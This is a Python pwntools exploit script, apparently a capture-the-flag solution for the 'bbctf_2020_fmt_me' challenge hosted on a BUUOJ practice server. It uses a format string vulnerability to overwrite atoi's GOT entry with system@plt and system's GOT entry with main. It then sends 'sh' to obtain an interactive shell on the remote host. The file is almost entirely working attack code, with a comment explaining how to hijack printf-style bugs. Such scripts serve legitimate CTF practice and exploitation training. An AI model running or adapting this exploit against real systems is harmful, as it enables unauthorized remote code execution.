# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './bbctf_2020_fmt_me'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25597'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,'b %s'%fun)

def cmd(num):
    sla(':',num)

#printf型的函数均有格式化字符串洞，单参函数都适合改成system
#需找到合适的跳转点重新利用格式化字符串

cmd(2)
mian = 0x4011f7
system_plt = elf.plt["system"]
system_got = elf.got["system"]
atoi_got = elf.got["atoi"]

payload = fmtstr_payload(6 ,{ atoi_got:system_plt+6, system_got :mian } )
sla("a gift.",payload)
cmd("sh")

p.interactive()

'''
@File    :   bbctf_2020_fmt_me.py
@Time    :   2021/07/22 00:20:48
@Author  :   Niyah 
'''